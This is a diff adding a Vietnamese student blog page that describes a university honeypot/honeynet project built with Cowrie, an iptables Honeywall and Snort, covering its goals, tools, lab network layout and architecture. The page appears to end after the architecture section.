@@ -1,0 +1,1738 @@
+
+
+
+  
+
+
+
+
+
+<!doctype html>
+<html
+  lang="vi"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HoneyPot/HoneyNet System - Đồ án An ninh mạng &middot; Blog của Triệu Xuân Dũng</title>
+    <meta name="title" content="HoneyPot/HoneyNet System - Đồ án An ninh mạng &middot; Blog của Triệu Xuân Dũng" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+    
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.c3d236fb27d5333aa172b376a62368b07beeeaeffdb574761ff290f6d5809002.css"
+    integrity="sha256-w9I2&#43;yfVMzqhcrN2piNosHvu6u/9tXR2H/KQ9tWAkAI="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      Hệ thống phát hiện và phân tích tấn công mạng sử dụng Cowrie, Honeywall và kỹ thuật cô lập mạng
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/projects/honeypot/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/projects/honeypot/">
+  <meta property="og:site_name" content="Blog của Triệu Xuân Dũng">
+  <meta property="og:title" content="HoneyPot/HoneyNet System - Đồ án An ninh mạng">
+  <meta property="og:description" content="Hệ thống phát hiện và phân tích tấn công mạng sử dụng Cowrie, Honeywall và kỹ thuật cô lập mạng">
+  <meta property="og:locale" content="vi">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="projects">
+    <meta property="article:published_time" content="2025-06-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-15T00:00:00+00:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Cowrie">
+    <meta property="article:tag" content="Ubuntu">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Networking">
+    <meta property="article:tag" content="Iptables">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HoneyPot/HoneyNet System - Đồ án An ninh mạng">
+  <meta name="twitter:description" content="Hệ thống phát hiện và phân tích tấn công mạng sử dụng Cowrie, Honeywall và kỹ thuật cô lập mạng">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Dự án của tôi",
+    "name": "HoneyPot\/HoneyNet System - Đồ án An ninh mạng",
+    "headline": "HoneyPot\/HoneyNet System - Đồ án An ninh mạng",
+    "description": "Hệ thống phát hiện và phân tích tấn công mạng sử dụng Cowrie, Honeywall và kỹ thuật cô lập mạng",
+    
+    "inLanguage": "vi",
+    "url" : "http:\/\/localhost:1313\/projects\/honeypot\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Triệu Xuân Dũng"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-06-15T00:00:00\u002b00:00",
+    "datePublished": "2025-06-15T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-06-15T00:00:00\u002b00:00",
+    
+    "keywords": ["Python","Cowrie","Ubuntu","Security","Networking","iptables","SSH","Honeypot","Honeynet","Network Security","Cyber Security","Penetration Testing","Kali Linux","Snort","IDS"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2002"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "Trang Chủ",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/projects/",
+       "name": "Dự Án Của Tôi",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/categories/security/",
+       "name": "Security",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "name": "Honey Pot Honey Net System Đồ Án an Ninh Mạng",
+       "position": 4
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="Triệu Xuân Dũng" />
+  
+  
+    
+      <link href="https://mastodon.social/@yourusername" rel="me" />
+    
+      <link href="https://github.com/yourusername" rel="me" />
+    
+      <link href="https://linkedin.com/in/yourprofile" rel="me" />
+    
+      <link href="https://facebook.com/yourprofile" rel="me" />
+    
+      <link href="https://twitter.com/yourusername" rel="me" />
+    
+      <link href="mailto:your@email.com" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+    
+<style>
+ 
+@media (max-width: 768px) {
+    .mobile-menu-wrapper {
+        position: fixed;
+        top: 1rem;
+        left: 0;
+        right: 0;
+        z-index: 2000;
+        display: flex;
+        justify-content: space-between;
+        padding: 0 1rem;
+        pointer-events: none;
+    }
+    
+    .mobile-menu-wrapper > * {
+        pointer-events: auto;
+    }
+    
+    .mobile-nav-btn,
+    .mobile-search-btn {
+        width: 48px;
+        height: 48px;
+        border-radius: 50%;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        transition: all 0.3s ease;
+    }
+    
+    .mobile-nav-btn {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        flex-direction: column;
+        gap: 4px;
+    }
+    
+    .mobile-nav-btn span {
+        width: 20px;
+        height: 2px;
+        background: white;
+        border-radius: 2px;
+        transition: all 0.3s ease;
+    }
+    
+    .mobile-nav-btn.active span:nth-child(1) {
+        transform: rotate(45deg) translate(5px, 5px);
+    }
+    
+    .mobile-nav-btn.active span:nth-child(2) {
+        opacity: 0;
+    }
+    
+    .mobile-nav-btn.active span:nth-child(3) {
+        transform: rotate(-45deg) translate(6px, -6px);
+    }
+    
+    .mobile-search-btn {
+        background: white;
+        border: 2px solid #667eea;
+    }
+    
+    .mobile-search-btn svg {
+        width: 24px;
+        height: 24px;
+        color: #667eea;
+    }
+    
+     
+    .mobile-sidebar {
+        position: fixed;
+        top: 0;
+        left: -280px;
+        width: 280px;
+        height: 100vh;
+        background: white;
+        z-index: 1999;
+        transition: left 0.3s ease;
+        box-shadow: 2px 0 10px rgba(0,0,0,0.1);
+        overflow-y: auto;
+        padding-top: 5rem;
+    }
+    
+    .mobile-sidebar.active {
+        left: 0;
+    }
+    
+    .mobile-sidebar a {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        padding: 1rem 1.5rem;
+        color: #374151;
+        text-decoration: none;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        border-left: 3px solid transparent;
+    }
+    
+    .mobile-sidebar a:hover {
+        background: rgba(102, 126, 234, 0.1);
+        border-left-color: #667eea;
+        color: #667eea;
+    }
+    
+    .mobile-sidebar svg {
+        width: 20px;
+        height: 20px;
+    }
+    
+     
+    .mobile-search-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.8);
+        backdrop-filter: blur(5px);
+        z-index: 2001;
+        display: none;
+        align-items: flex-start;
+        justify-content: center;
+        padding: 2rem;
+        padding-top: 5rem;
+    }
+    
+    .mobile-search-overlay.active {
+        display: flex;
+    }
+    
+    .search-box {
+        background: white;
+        border-radius: 16px;
+        width: 100%;
+        max-width: 500px;
+        padding: 2rem;
+        position: relative;
+    }
+    
+    .search-box input {
+        width: 100%;
+        padding: 1rem;
+        border: 2px solid #667eea;
+        border-radius: 12px;
+        font-size: 1rem;
+    }
+    
+    .search-close {
+        position: absolute;
+        top: 1rem;
+        right: 1rem;
+        background: none;
+        border: none;
+        font-size: 2rem;
+        color: #9ca3af;
+        cursor: pointer;
+    }
+    
+     
+    .mobile-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.5);
+        z-index: 1998;
+        display: none;
+    }
+    
+    .mobile-overlay.active {
+        display: block;
+    }
+    
+     
+    .dark .mobile-sidebar,
+    .dark .search-box {
+        background: #1f2937;
+    }
+    
+    .dark .mobile-sidebar a {
+        color: #d1d5db;
+    }
+    
+    .dark .search-box input {
+        background: #111827;
+        color: white;
+    }
+}
+
+@media (min-width: 769px) {
+    .mobile-menu-wrapper,
+    .mobile-sidebar,
+    .mobile-search-overlay,
+    .mobile-overlay {
+        display: none !important;
+    }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    
+    if (window.innerWidth > 768) return;
+    
+    
+    const menuHTML = `
+        <div class="mobile-menu-wrapper">
+            <button class="mobile-nav-btn" id="mobileNavBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <button class="mobile-search-btn" id="mobileSearchBtn">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                </svg>
+            </button>
+        </div>
+        
+        <div class="mobile-sidebar" id="mobileSidebar">
+            <a href="/">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
+                Trang chủ
+            </a>
+            <a href="/about/">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+                Về tôi
+            </a>
+            <a href="/projects/">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
+                Dự án
+            </a>
+            <a href="/posts/">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+                Bài viết
+            </a>
+            <a href="/contact/">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                Liên hệ
+            </a>
+        </div>
+        
+        <div class="mobile-search-overlay" id="mobileSearchOverlay">
+            <div class="search-box">
+                <button class="search-close" id="searchClose">×</button>
+                <input type="text" placeholder="Tìm kiếm bài viết..." id="searchInput">
+            </div>
+        </div>
+        
+        <div class="mobile-overlay" id="mobileOverlay"></div>
+    `;
+    
+    document.body.insertAdjacentHTML('afterbegin', menuHTML);
+    
+    
+    const navBtn = document.getElementById('mobileNavBtn');
+    const searchBtn = document.getElementById('mobileSearchBtn');
+    const sidebar = document.getElementById('mobileSidebar');
+    const searchOverlay = document.getElementById('mobileSearchOverlay');
+    const overlay = document.getElementById('mobileOverlay');
+    const searchClose = document.getElementById('searchClose');
+    
+    
+    function toggleMenu() {
+        navBtn.classList.toggle('active');
+        sidebar.classList.toggle('active');
+        overlay.classList.toggle('active');
+        document.body.style.overflow = sidebar.classList.contains('active') ? 'hidden' : '';
+    }
+    
+    
+    function toggleSearch() {
+        searchOverlay.classList.toggle('active');
+        document.body.style.overflow = searchOverlay.classList.contains('active') ? 'hidden' : '';
+    }
+    
+    
+    navBtn.addEventListener('click', toggleMenu);
+    searchBtn.addEventListener('click', toggleSearch);
+    overlay.addEventListener('click', toggleMenu);
+    searchClose.addEventListener('click', toggleSearch);
+    
+    
+    sidebar.querySelectorAll('a').forEach(link => {
+        link.addEventListener('click', toggleMenu);
+    });
+});
+</script>
+
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Blog của Triệu Xuân Dũng</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/"
+                  title="Trang chủ"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Trang chủ</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="Về tôi"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Về tôi</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/projects/"
+                  title="Dự án của tôi"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Dự án</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Posts"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Bài viết</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/contact/"
+                  title="Liên hệ"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Liên hệ</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article class="max-w-full">
+    <header>
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HoneyPot/HoneyNet System - Đồ án An ninh mạng
+      </h1>
+    </header>
+    <section class="prose mt-6 max-w-full dark:prose-invert">
+      <h1 id="-honeypothoneynet-system" class="relative group">🍯 HoneyPot/HoneyNet System <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-honeypothoneynet-system" aria-label="Anchor">#</a></span></h1><div class="flex flex-wrap gap-2 mb-8">
+  <span class="px-3 py-1 bg-yellow-100 dark:bg-yellow-900 text-yellow-700 dark:text-yellow-300 rounded-full text-sm font-medium">🐍 Python</span>
+  <span class="px-3 py-1 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-300 rounded-full text-sm font-medium">🍯 Cowrie</span>
+  <span class="px-3 py-1 bg-orange-100 dark:bg-orange-900 text-orange-700 dark:text-orange-300 rounded-full text-sm font-medium">🐧 Ubuntu</span>
+  <span class="px-3 py-1 bg-purple-100 dark:bg-purple-900 text-purple-700 dark:text-purple-300 rounded-full text-sm font-medium">🔒 Security</span>
+  <span class="px-3 py-1 bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300 rounded-full text-sm font-medium">🌐 Networking</span>
+  <span class="px-3 py-1 bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-300 rounded-full text-sm font-medium">🛡️ iptables</span>
+  <span class="px-3 py-1 bg-indigo-100 dark:bg-indigo-900 text-indigo-700 dark:text-indigo-300 rounded-full text-sm font-medium">🔑 SSH</span>
+  <span class="px-3 py-1 bg-pink-100 dark:bg-pink-900 text-pink-700 dark:text-pink-300 rounded-full text-sm font-medium">🎯 Penetration Testing</span>
+</div>
+<div class="mb-8 p-6 bg-gradient-to-r from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border-l-4 border-blue-500">
+  <div class="flex items-center gap-4 mb-4">
+    <div class="text-4xl">🎓</div>
+    <div>
+      <h3 class="text-xl font-bold text-blue-900 dark:text-blue-100">Đồ án cơ sở An ninh mạng</h3>
+      <p class="text-blue-700 dark:text-blue-300">Trường Đại học Công nghệ TP.HCM (HUTECH) • 2025</p>
+    </div>
+  </div>
+  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
+    <div class="text-center">
+      <div class="text-2xl font-bold text-blue-600">4</div>
+      <div class="text-sm text-gray-600 dark:text-gray-400">Tháng thực hiện</div>
+    </div>
+    <div class="text-center">
+      <div class="text-2xl font-bold text-green-600">28</div>
+      <div class="text-sm text-gray-600 dark:text-gray-400">Hình ảnh demo</div>
+    </div>
+    <div class="text-center">
+      <div class="text-2xl font-bold text-purple-600">2</div>
+      <div class="text-sm text-gray-600 dark:text-gray-400">Mô hình triển khai</div>
+    </div>
+    <div class="text-center">
+      <div class="text-2xl font-bold text-orange-600">147</div>
+      <div class="text-sm text-gray-600 dark:text-gray-400">Kết nối SSH test</div>
+    </div>
+  </div>
+</div>
+<hr>
+<h2 id="-thông-tin-dự-án" class="relative group">📋 Thông tin dự án <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-th%c3%b4ng-tin-d%e1%bb%b1-%c3%a1n" aria-label="Anchor">#</a></span></h2><div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
+    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">👥 Nhóm thực hiện</h4>
+    <ul class="space-y-1 text-gray-700 dark:text-gray-300">
+      <li> Triệu Xuân Dũng (2280600424)</li>
+      <li> Đặng Nhật Nam (22806001987)</li>
+    </ul>
+  </div>
+  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
+    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">🎯 Giảng viên hướng dẫn</h4>
+    <p class="text-gray-700 dark:text-gray-300">ThS. Phan Đình Duy Thông</p>
+    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">Bộ môn An ninh mạng</p>
+  </div>
+  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
+    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">🏫 Trường</h4>
+    <p class="text-gray-700 dark:text-gray-300">Đại học Công nghệ TP.HCM</p>
+    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">Chuyên ngành: An ninh mạng</p>
+  </div>
+  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
+    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">📅 Thời gian</h4>
+    <p class="text-gray-700 dark:text-gray-300">Tháng 06/2025 - 08/2025</p>
+    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">4 tháng (Hoàn thành)</p>
+  </div>
+</div>
+<hr>
+<h2 id="-mục-tiêu-dự-án" class="relative group">🎯 Mục tiêu dự án <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-m%e1%bb%a5c-ti%c3%aau-d%e1%bb%b1-%c3%a1n" aria-label="Anchor">#</a></span></h2><h3 id="mục-tiêu-chính" class="relative group"><strong>Mục tiêu chính</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#m%e1%bb%a5c-ti%c3%aau-ch%c3%adnh" aria-label="Anchor">#</a></span></h3><p>Xây dựng một hệ thống Honeypot/Honeynet hoàn chỉnh để:</p>
+<ul>
+<li>Thu hút và ghi nhận hành vi của kẻ tấn công trong môi trường an toàn</li>
+<li>Phân tích chiến thuật, kỹ thuật và công cụ mà hacker sử dụng</li>
+<li>Bảo vệ mạng nội bộ khỏi các cuộc tấn công thực tế</li>
+<li>Nghiên cứu các phương pháp phòng thủ hiệu quả</li>
+</ul>
+<h3 id="bài-toán-cần-giải-quyết" class="relative group"><strong>Bài toán cần giải quyết</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#b%c3%a0i-to%c3%a1n-c%e1%ba%a7n-gi%e1%ba%a3i-quy%e1%ba%bft" aria-label="Anchor">#</a></span></h3><p><strong>Tình hình an ninh mạng hiện nay:</strong></p>
+<ul>
+<li>Các cuộc tấn công ngày càng tinh vi và có tổ chức</li>
+<li>Hệ thống phòng thủ truyền thống (firewall, IDS/IPS) chỉ phản ứng với mối đe dọa đã biết</li>
+<li>Thiếu dữ liệu thực tế về hành vi tấn công để cải thiện bảo mật</li>
+</ul>
+<p><strong>Giải pháp:</strong>
+Triển khai Honeypot/Honeynet như một hệ thống chủ động để:</p>
+<ul>
+<li>Thu thập dữ liệu tấn công thực tế</li>
+<li>Hiểu rõ mindset và phương pháp của kẻ tấn công</li>
+<li>Cung cấp cảnh báo sớm cho hệ thống thật</li>
+</ul>
+<hr>
+<h2 id="-công-nghệ-sử-dụng" class="relative group">🛠️ Công nghệ sử dụng <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-c%c3%b4ng-ngh%e1%bb%87-s%e1%bb%ad-d%e1%bb%a5ng" aria-label="Anchor">#</a></span></h2><h3 id="core-technologies" class="relative group"><strong>Core Technologies</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#core-technologies" aria-label="Anchor">#</a></span></h3><p><strong>1. Cowrie SSH/Telnet Honeypot</strong></p>
+<ul>
+<li>Phiên bản: Latest stable</li>
+<li>Vai trò: Honeypot tương tác trung bình</li>
+<li>Tính năng:
+<ul>
+<li>Mô phỏng SSH server (OpenSSH 6.0p1)</li>
+<li>Ghi lại toàn bộ lệnh và hành vi</li>
+<li>Thu thập malware samples</li>
+<li>Fake filesystem để đánh lừa hacker</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. Ubuntu Server</strong></p>
+<ul>
+<li>OS: Ubuntu 20.04 LTS / Debian</li>
+<li>Vai trò: Nền tảng chạy Honeypot và Honeywall</li>
+<li>Cấu hình:
+<ul>
+<li>Honeypot: 192.168.2.10 (DMZ)</li>
+<li>Honeywall: 192.168.159.143 (Router)</li>
+</ul>
+</li>
+</ul>
+<p><strong>3. iptables Firewall</strong></p>
+<ul>
+<li>Vai trò: Cô lập và kiểm soát lưu lượng</li>
+<li>Chức năng:
+<ul>
+<li>NAT (PREROUTING, POSTROUTING)</li>
+<li>FORWARD rules để bảo vệ LAN</li>
+<li>LOG rules để ghi nhận tấn công</li>
+<li>Dynamic blocking</li>
+</ul>
+</li>
+</ul>
+<p><strong>4. Network Segmentation</strong></p>
+<ul>
+<li>DMZ: 192.168.2.0/24 (Vùng Honeypot)</li>
+<li>LAN: 192.168.3.0/24 (Mạng nội bộ)</li>
+<li>Hacker Network: 192.168.159.0/24</li>
+</ul>
+<h3 id="attack-simulation-tools" class="relative group"><strong>Attack Simulation Tools</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attack-simulation-tools" aria-label="Anchor">#</a></span></h3><p>Để test hệ thống, chúng tôi sử dụng:</p>
+<ul>
+<li><strong>Nmap:</strong> Quét cổng và dịch vụ</li>
+<li><strong>Hydra:</strong> Tấn công Brute Force SSH</li>
+<li><strong>Kali Linux:</strong> Môi trường penetration testing</li>
+</ul>
+<h3 id="monitoring--analysis" class="relative group"><strong>Monitoring &amp; Analysis</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#monitoring--analysis" aria-label="Anchor">#</a></span></h3><ul>
+<li><strong>Snort:</strong> Intrusion Detection System</li>
+<li><strong>Barnyard2:</strong> Log processor</li>
+<li><strong>Custom Python scripts:</strong> Phân tích log Cowrie</li>
+</ul>
+<hr>
+<h2 id="-kiến-trúc-hệ-thống" class="relative group">🏗️ Kiến trúc hệ thống <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-ki%e1%ba%bfn-tr%c3%bac-h%e1%bb%87-th%e1%bb%91ng" aria-label="Anchor">#</a></span></h2><h3 id="sơ-đồ-tổng-quan" class="relative group"><strong>Sơ đồ tổng quan</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#s%c6%a1-%c4%91%e1%bb%93-t%e1%bb%95ng-quan" aria-label="Anchor">#</a></span></h3><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/architecture-honeypot.png" alt="Kiến trúc Honeypot" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 1: Sơ đồ kiến trúc Honeypot trong hệ thống mạng</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/architecture-honeynet.png" alt="Kiến trúc Honeynet" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 2: Sơ đồ kiến trúc Honeynet với nhiều Honeypot</em></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/images/projects/honeypot/honeywall-architecture.png" alt="Honeywall Architecture" class="mx-auto my-0 rounded-md" />
+</figure>
+
+<em>Hình 3: Sơ đồ kiến trúc Honeywall trong hệ thống</em></p>
+<h3 id="giải-thích-kiến-trúc" class="relative group"><strong>Giải thích kiến trúc</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#gi%e1%ba%a3i-th%c3%adch-ki%e1%ba%bfn-tr%c3%bac" aria-label="Anchor">#</a></span></h3><pre tabindex="0"><code>Internet/Hacker (192.168.159.0/24)
+         ↓
+   Honeywall (192.168.159.143)
+   - iptables NAT
+   - Snort IDS
+   - Traffic Control
+         ↓
+    ┌────────────────┐
+    ↓                ↓
+DMZ (Honeypot)    LAN (Protected)
+192.168.2.10      192.168.3.0/24
+- Cowrie          - Real Systems
+- Fake Services   - Isolated
+</code></pre><p><strong>Cơ chế hoạt động:</strong></p>
+<ol>
+<li><strong>Hacker quét mạng</strong> → Phát hiện cổng 2222 (SSH) mở</li>
+<li><strong>Hacker tấn công Brute Force</strong> → Honeywall ghi log</li>
+<li><strong>Hacker xâm nhập</strong> → Lưu lượng NAT đến Honeypot</li>
+<li><strong>Cowrie ghi nhận</strong> → Mọi lệnh, file download được log</li>
+<li><strong>Phát hiện mã độc</strong> → Cowrie ngắt kết nối</li>
+<li><strong>Honeywall chặn IP</strong> → Bảo vệ hệ thống thật</li>
+</ol>
+<hr>
